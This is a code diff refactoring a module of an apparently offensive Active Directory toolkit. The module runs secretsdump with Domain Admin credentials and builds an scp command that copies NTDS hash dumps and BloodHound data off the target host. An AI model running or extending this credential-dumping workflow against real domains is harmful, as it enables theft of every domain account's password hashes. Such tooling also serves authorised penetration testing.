@@ -2,7 +2,6 @@
 NTDS dumping functionality.
 """
 
-import json
 import subprocess
 import typer
 
@@ -16,34 +15,7 @@ from ad_kit.core.console import (
     print_section,
     print_success,
 )
-
-
-def load_session() -> dict:
-    """
-    Load AD-Kit session metadata.
-    """
-
-    session_file = Path(".ad-kit-session.json")
-
-    if not session_file.exists():
-        raise RuntimeError(
-            "Session metadata not found. Run 'ad-kit enum' first."
-        )
-
-    return json.loads(session_file.read_text(encoding="utf-8"))
-
-
-def save_session(
-    session_data: dict,
-) -> None:
-    """
-    Save AD-Kit session metadata.
-    """
-
-    Path(".ad-kit-session.json").write_text(
-        json.dumps(session_data, indent=4),
-        encoding="utf-8",
-    )
+from ad_kit.core.util import load_session, save_session, get_artefacts_dir
 
 
 def print_summary(
@@ -103,12 +75,11 @@ def generate_scp_command(
 
     save_session(session_data)
 
-    cwd = Path.cwd()
+    artefacts_dir = get_artefacts_dir()
 
     command = (
         f'scp -i "{ssh_key}" '
-        f'"{user}@{host}:{cwd}/hashes/*.ntds" '
-        f'"{user}@{host}:{cwd}/bloodhound/*.zip" '
+        f'"{user}@{host}:{artefacts_dir.resolve()}/*" '
         f'./'
     )
 
@@ -141,8 +112,7 @@ def run_dump() -> None:
 
         da_pass = typer.prompt("Domain Admin Password", hide_input=True)
 
-        output_dir = Path("hashes")
-        output_dir.mkdir(exist_ok=True)
+        output_dir = get_artefacts_dir()
 
         print_info("Running secretsdump...")
 
@@ -174,7 +144,6 @@ def run_dump() -> None:
             return
 
         session_data["ntds_dumped"] = True
-
         save_session(session_data)
 
         print_success("NTDS dump completed.")
